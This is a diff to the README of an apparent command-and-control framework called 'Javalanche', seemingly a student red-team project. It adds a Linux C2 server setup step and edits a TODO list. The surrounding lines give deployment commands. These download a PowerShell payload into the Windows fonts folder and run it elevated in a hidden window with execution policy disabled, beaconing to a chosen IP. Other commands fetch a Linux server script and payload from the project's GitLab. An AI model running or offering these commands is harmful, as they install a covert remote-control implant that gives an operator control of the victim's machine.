@@ -25,6 +25,9 @@ ps> wget -o C:\Windows\fonts\Javalanche.ps1 "https://gitlab.ritsec.cloud/jms9508
 ps> Start-Process -FilePath "powershell.exe" -ArgumentList "set-executionpolicy -ExecutionPolicy Unrestricted -Scope Process -Force;& C:\Windows\fonts\Javalanche.ps1 -BeaconIPAddress {IP Address of Beacon}" -WindowStyle Hidden -Verb RunAs
 
 
+Linux C2 Server
+$ sudo curl -o serverSetup.sh https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Setup/ServerSetup.sh?ref_type=heads
+
 Linux Payload
 
 bash> git clone "https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/linuxPayload.bash?ref_type=heads"
@@ -97,15 +100,13 @@ UML:
 ![alt text](Images/DannyJamesC2UML.drawio.png)
 
 **TODO**
-Add actual HTTP protocol instead of just tcp port 80,
-
 Add Linux Attack Chains,
-
-Add Linux Server Setup,
 
 Add Linux Usage Instructions,
 
 Fix Linux Payload,
+
+Clean up Linux Server Setup output,
 
 Javalanche ASCII Art,
 
